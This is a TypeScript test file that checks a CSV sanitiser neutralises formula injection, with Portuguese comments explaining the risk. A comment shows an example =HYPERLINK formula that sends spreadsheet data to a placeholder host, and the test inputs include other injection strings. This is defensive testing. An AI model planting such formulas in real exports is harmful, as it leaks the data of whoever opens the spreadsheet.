import { csvCelula } from './csv.util';

/**
 * Nome de visitante, descrição de lançamento etc. são digitados por terceiros
 * (morador, ERP). Começando com = + - @, o Excel/LibreOffice executa como
 * fórmula ao abrir o CSV — ex.: =HYPERLINK("http://x/?"&A2;"clique") vaza a
 * planilha do síndico (CSV/formula injection, OWASP).
 */
describe('csvCelula', () => {
  it.each([
    ['=HYPERLINK("http://x")', `"'=HYPERLINK(""http://x"")"`],
    ['+55 11 9999', "'+55 11 9999"],
    ['@SUM(A1)', "'@SUM(A1)"],
    ['-2+3', "'-2+3"],
    ['\tcmd', "'\tcmd"],
  ])('neutraliza fórmula: %s', (entrada, saida) => {
    expect(csvCelula(entrada)).toBe(saida);
  });

  it.each([
    ['-R$ 250,00', '"-R$ 250,00"'],
    ['-12.50', '-12.50'],
    ['Maria da Silva', 'Maria da Silva'],
    ['', ''],
  ])('mantém valor comum (sem apóstrofo): %s', (v, saida) => {
    expect(csvCelula(v)).toBe(saida);
  });

  it('continua escapando vírgula, aspas e quebra de linha', () => {
    expect(csvCelula('a,"b"\nc')).toBe('"a,""b""\nc"');
    expect(csvCelula(null)).toBe('');
    expect(csvCelula(10)).toBe('10');
  });
});
